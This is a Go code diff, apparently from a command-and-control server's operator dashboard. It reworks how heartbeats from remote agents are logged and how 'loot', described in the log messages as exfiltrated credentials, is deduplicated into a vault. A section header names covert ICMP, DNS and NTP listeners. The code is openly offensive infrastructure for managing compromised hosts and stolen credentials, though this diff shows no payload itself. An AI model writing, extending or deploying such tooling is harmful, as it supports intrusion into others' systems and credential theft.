@@ -80,74 +80,75 @@ type Loot struct {
 // --- NETWORK LOGIC & HEARTBEAT ---
 
 func LogHeartbeat(transport string, t Telemetry) {
-	arrival := time.Now()
-	t.Transport = transport
-	t.LastSeen = arrival
+    arrival := time.Now()
+    t.Transport = transport
+    t.LastSeen = arrival
 
-	IngestLoot(t)
+    // Capture if this is new intel
+    isNewLoot := IngestLoot(t)
 
-	agentMutex.Lock()
-	activeAgents[t.AgentID] = &t
-	agentMutex.Unlock()
+    agentMutex.Lock()
+    _, alreadyKnown := activeAgents[t.AgentID]
+    activeAgents[t.AgentID] = &t
+    agentMutex.Unlock()
 
-	app.QueueUpdateDraw(func() {
-		// Calculate Real-Time Metrics
-		rtt := int(time.Since(arrival).Microseconds())
-		if lastRTT != 0 {
-			diff := rtt - lastRTT
-			if diff < 0 {
-				diff = -diff
-			}
-			currentJitter = diff
-		}
-		lastRTT = rtt
+    app.QueueUpdateDraw(func() {
+        // ... (Metrics calculation remains the same) ...
+        rtt := int(time.Since(arrival).Microseconds())
+        if lastRTT != 0 {
+            diff := rtt - lastRTT
+            if diff < 0 { diff = -diff }
+            currentJitter = diff
+        }
+        lastRTT = rtt
 
-		refreshAgentTable()
-		ts := arrival.Format("15:04:05")
+        refreshAgentTable()
+        ts := arrival.Format("15:04:05")
 
-		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
-			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n",
-				ts, t.AgentID, t.ArtifactPreview[4:])
-		} else if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
-			fmt.Fprintf(agentLog, "[%s] [black:yellow][ LOOT ACQUIRED ][-:-] [blue]%s[white] exfiltrated credentials\n",
-				ts, t.AgentID)
-		} else if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
-			fmt.Fprintf(agentLog, "[%s] [yellow]RECON[white] [blue]%s[white]: %s\n",
-				ts, t.AgentID, t.ArtifactPreview)
-		} else {
-			fmt.Fprintf(agentLog, "[%s] [blue]HANDSHAKE[white] %s via %s\n",
-				ts, t.AgentID, transport)
-		}
-	})
+        if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
+            fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n",
+                ts, t.AgentID, t.ArtifactPreview[4:])
+        } else if isNewLoot {
+            // ONLY log loot if it was unique
+            fmt.Fprintf(agentLog, "[%s] [black:yellow][ LOOT ACQUIRED ][-:-] [blue]%s[white] exfiltrated unique credentials\n",
+                ts, t.AgentID)
+        } else if !alreadyKnown {
+            fmt.Fprintf(agentLog, "[%s] [blue]NODE_JOIN[white] %s established via %s\n",
+                ts, t.AgentID, transport)
+        }
+        // Routine "WAIT" heartbeats or duplicate loot are now completely silent.
+    })
 }
 
 // --- UPDATED LOOT INGESTION (DEDUPLICATED) ---
 
-func IngestLoot(t Telemetry) {
-	if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
-		parts := strings.SplitN(t.ArtifactPreview, ":", 3)
-		if len(parts) == 3 {
-			category := parts[1]
-			data := parts[2]
+func IngestLoot(t Telemetry) bool {
+    if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
+        parts := strings.SplitN(t.ArtifactPreview, ":", 3)
+        if len(parts) == 3 {
+            category := parts[1]
+            data := parts[2]
 
-			lootMutex.Lock()
-			defer lootMutex.Unlock()
+            lootMutex.Lock()
+            defer lootMutex.Unlock()
 
-			// Check for existing entry to prevent log spam
-			for _, item := range vault {
-				if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
-					return // Already exists in the Secure Vault
-				}
-			}
+            // Check for existing entry
+            for _, item := range vault {
+                if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
+                    return false // Duplicate data, do not alert
+                }
+            }
 
-			vault = append(vault, Loot{
-				AgentID:   t.AgentID,
-				Category:  category,
-				Data:      data,
-				Timestamp: time.Now(),
-			})
-		}
-	}
+            vault = append(vault, Loot{
+                AgentID:   t.AgentID,
+                Category:  category,
+                Data:      data,
+                Timestamp: time.Now(),
+            })
+            return true // NEW unique loot saved
+        }
+    }
+    return false
 }
 
 // --- LISTENER PROTOCOLS (ICMP, DNS, NTP) ---
